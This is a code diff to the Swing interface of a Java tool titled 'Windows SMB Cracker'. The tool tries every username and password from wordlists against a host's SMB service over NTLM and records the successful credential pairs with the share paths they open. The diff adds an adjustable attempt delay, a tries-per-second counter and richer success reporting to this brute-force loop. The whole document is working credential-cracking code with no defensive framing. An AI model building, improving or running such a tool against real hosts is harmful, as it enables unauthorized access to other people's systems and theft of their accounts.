@@ -28,6 +28,7 @@ import java.util.concurrent.TimeUnit;
 public class MainWindow extends JFrame {
 
     private final DefaultTableModel resultsModel;
+    private final PerSecondCounter perSecondCounter = new PerSecondCounter();
 
     private ExecutorService executors;
     private boolean running;
@@ -35,7 +36,11 @@ public class MainWindow extends JFrame {
     private long usersCount;
     private File passwordsFile;
     private long passwordsCount;
+
+    private JButton startBtn;
     private JProgressBar progressBar;
+    private JLabel lblTps;
+    private JSpinner delayMs;
 
     public MainWindow() throws Exception {
         log.trace("MainWindow()");
@@ -124,10 +129,18 @@ public class MainWindow extends JFrame {
         topPanel.add(passwordsFileName, "");
         topPanel.add(lblPasswordsCount, "wrap");
 
+        var lblDelay = new JLabel("Attempt Delay");
+        delayMs = new JSpinner();
+        delayMs.setModel(new SpinnerNumberModel(100, 0, 20000, 100));
+
+        topPanel.add(lblDelay, "width 80!");
+        topPanel.add(delayMs, "width 80!");
+        topPanel.add(new JLabel("ms"), "wrap");
+
         progressBar = new JProgressBar();
         progressBar.setStringPainted(true);
         progressBar.setString("Idle");
-        var startBtn = new JButton("Start");
+        startBtn = new JButton("Start");
 
         topPanel.add(progressBar, "grow");
         topPanel.add(startBtn, "width 100!, wrap");
@@ -145,27 +158,27 @@ public class MainWindow extends JFrame {
         var bottomPanel = new JPanel(new MigLayout("fillx, nogrid"));
         add(bottomPanel, BorderLayout.SOUTH);
 
-        var lblTps = new JLabel("0 tries/second");
-        var saveResults = new JButton("Save Results");
+        lblTps = new JLabel("0 tries/second");
 
         bottomPanel.add(lblTps, "grow");
-        bottomPanel.add(saveResults, "width 100!, wrap");
 
         startBtn.addActionListener(e -> new Thread(() -> {
             if (running) {
+                log.debug("Stopping...");
+
                 SwingUtilities.invokeLater(() -> {
                     startBtn.setEnabled(false);
                     startBtn.setText("Stopping");
                     progressBar.setForeground(new Color(179, 98, 0));
                 });
 
+                running = false;
+
                 try {
                     executors.shutdown();
                     executors.awaitTermination(Long.MAX_VALUE, TimeUnit.NANOSECONDS);
                 } catch (InterruptedException ignored) {
                 }
-
-                running = false;
 
                 SwingUtilities.invokeLater(() -> {
                     startBtn.setEnabled(true);
@@ -187,6 +200,8 @@ public class MainWindow extends JFrame {
                 startCracking(address.getText(), domain.getText());
             }
         }).start());
+
+        perSecondCounter.start();
     }
 
     public long getLineCount(File file) {
@@ -216,29 +231,28 @@ public class MainWindow extends JFrame {
                     try (var fr2 = new FileReader(passwordsFile);
                          var passReader = new BufferedReader(fr2)) {
                         while ((password = passReader.readLine()) != null) {
-                            log.debug("{} {} {} {}", address, domain, username, password);
-
                             try {
-                                Thread.sleep(500);
+                                Thread.sleep((int) delayMs.getValue());
 
-                                String status = attemptLogin(address, domain, username, password);
+                                String[] status = attemptLogin(address, domain, username, password);
+                                if (!"failed".equals(status[0])) {
+                                    log.debug("Login Success [status={} address={} domain={} username={} password={}]", status, address, domain, username, password);
 
-                                log.debug(status);
-
-                                if (!"failed".equals(status)) {
-                                    resultsModel.addRow(new String[]{username + ":" + password, "", status});
+                                    resultsModel.addRow(new String[]{username + ":" + password, status[1], status[0]});
                                 }
-                            } catch (Exception e) {
-                                log.warn("Login attempt failure", e);
+                            } catch (Exception ignored) {
                             }
 
                             tries++;
+                            perSecondCounter.increment();
 
                             double percentage = (double) tries / (usersCount * passwordsCount) * 100.0;
-                            log.debug("{} {}", tries, percentage);
+                            final String u = username, p = password;
                             SwingUtilities.invokeLater(() -> {
+                                setTitle("Windows SMB Cracker - " + u + ":" + p);
                                 progressBar.setString(String.format("%.2f%%", percentage));
                                 progressBar.setValue((int) percentage);
+                                lblTps.setText(perSecondCounter.getTps() + " tries/second");
                             });
 
                             if (!running) {
@@ -257,41 +271,51 @@ public class MainWindow extends JFrame {
             }
 
             try {
-                Thread.sleep(3000);
+                Thread.sleep(1000);
             } catch (InterruptedException e) {
                 throw new RuntimeException(e);
             }
 
-            log.debug("Done");
+            running = false;
+
+            double percentage = (double) tries / (usersCount * passwordsCount) * 100.0;
+            log.debug("Done {} {}", tries, percentage);
+            SwingUtilities.invokeLater(() -> {
+                startBtn.setText("Start");
+                progressBar.setString(String.format("%.2f%%", percentage));
+                progressBar.setValue((int) percentage);
+                progressBar.setIndeterminate(false);
+                lblTps.setText(perSecondCounter.getTps() + " tries/second");
+            });
         });
     }
 
-    public String attemptLogin(String host, String domain, String user, String pass) throws SmbException {
+    public String[] attemptLogin(String host, String domain, String user, String pass) throws SmbException {
         try {
             var ntlmAuth = new NtlmPasswordAuthentication(domain, user, pass);
             var domains = new SmbFile("smb://" + host + "/", ntlmAuth).listFiles();
-            for (int a = 0; a < domains.length; ++a) {
-                log.debug(domains[a].getPath());
-                var file = new File(domains[a].getPath().replace("smb://", "\\"));
+            for (int i = 0; i < domains.length; ++i) {
+                var path = domains[i].getPath();
+                var file = new File(path.replace("smb://", "\\"));
                 if (file.exists()) {
-                    return "local-access";
+                    return new String[]{"local-access", path};
                 }
 
                 try {
-                    domains[a].listFiles();
-                    return "smb-access";
+                    domains[i].listFiles();
+                    return new String[]{"smb-access", path};
                 } catch (SmbAuthException ignored) {
-                    return "restricted-access";
+                    return new String[]{"restricted-access", path};
                 } catch (Exception ignored) {
                 }
             }
-            return "login-no-files";
+            return new String[]{"login-only", ""};
         } catch (SmbException e) {
             throw e;
         } catch (Exception e) {
             log.warn(e);
         }
-        return "failed";
+        return new String[]{"failed", ""};
     }
 
 }
